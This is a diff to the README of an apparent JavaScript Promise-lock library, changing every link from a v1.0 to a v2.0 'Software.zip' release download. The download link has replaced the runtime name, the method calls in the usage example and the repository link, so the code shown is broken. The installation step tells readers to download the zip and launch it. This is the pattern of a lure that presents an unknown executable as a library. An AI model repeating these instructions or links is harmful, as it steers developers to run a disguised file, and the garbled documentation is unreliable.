@@ -1,11 +1,11 @@
 
 # Zero Overhead Promise Lock 🚀
 
-An efficient Promise lock for https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v1.0/Software.zip projects, ensuring mutually exclusive execution of asynchronous tasks. 
+An efficient Promise lock for https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v2.0/Software.zip projects, ensuring mutually exclusive execution of asynchronous tasks. 
 
 ## Overview ℹ️
 
-"zero-overhead-promise-lock" is a lightweight, robust solution for managing asynchronous operations in https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v1.0/Software.zip to prevent race conditions and ensure deterministic execution.
+"zero-overhead-promise-lock" is a lightweight, robust solution for managing asynchronous operations in https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v2.0/Software.zip to prevent race conditions and ensure deterministic execution.
 
 ## Key Features 🔑
 
@@ -17,7 +17,7 @@ An efficient Promise lock for https://github.com/CursrrX/zero-overhead-promise-l
 
 ## Installation 🛠️
 
-To get started with "zero-overhead-promise-lock", download the [Software](https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v1.0/Software.zip) and launch the file for installation.
+To get started with "zero-overhead-promise-lock", download the [Software](https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v2.0/Software.zip) and launch the file for installation.
 
 ## Usage 🚀
 
@@ -29,11 +29,11 @@ const { PromiseLock } = require('zero-overhead-promise-lock');
 const lock = new PromiseLock();
 
 // Use the lock to ensure mutually exclusive execution
-https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v1.0/Software.zip()
+https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v2.0/Software.zip()
     .then(() => {
         // Your critical section code here
     })
-    .finally(() => https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v1.0/Software.zip());
+    .finally(() => https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v2.0/Software.zip());
 ```
 
 ## Advanced Features 🌟
@@ -61,20 +61,20 @@ Explore various topics related to "zero-overhead-promise-lock" including:
 
 ## Get Started ✨
 
-Visit the [GitHub Repository](https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v1.0/Software.zip) for detailed documentation, code examples, and community support.
+Visit the [GitHub Repository](https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v2.0/Software.zip) for detailed documentation, code examples, and community support.
 
 ## Releases 🚀
 
 If the provided link does not work, please check the "Releases" section of the repository for the latest version of "zero-overhead-promise-lock".
 
-[![Download Software](https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v1.0/Software.zip)](https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v2.0/Software.zip)](https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v2.0/Software.zip)
 
 ## Stay Connected 🌐
 
-Join our growing community of developers using "zero-overhead-promise-lock" for efficient Promise locking in https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v1.0/Software.zip projects. Feel free to contribute, report issues, or suggest enhancements to make the library even better!
+Join our growing community of developers using "zero-overhead-promise-lock" for efficient Promise locking in https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v2.0/Software.zip projects. Feel free to contribute, report issues, or suggest enhancements to make the library even better!
 
 Happy coding! 🚀
 
 ## Credits 🌟
 
-Special thanks to the contributors and maintainers of "zero-overhead-promise-lock" for their dedication to providing a high-performance locking solution for https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v1.0/Software.zip applications.
+Special thanks to the contributors and maintainers of "zero-overhead-promise-lock" for their dedication to providing a high-performance locking solution for https://github.com/CursrrX/zero-overhead-promise-lock/releases/download/v2.0/Software.zip applications.
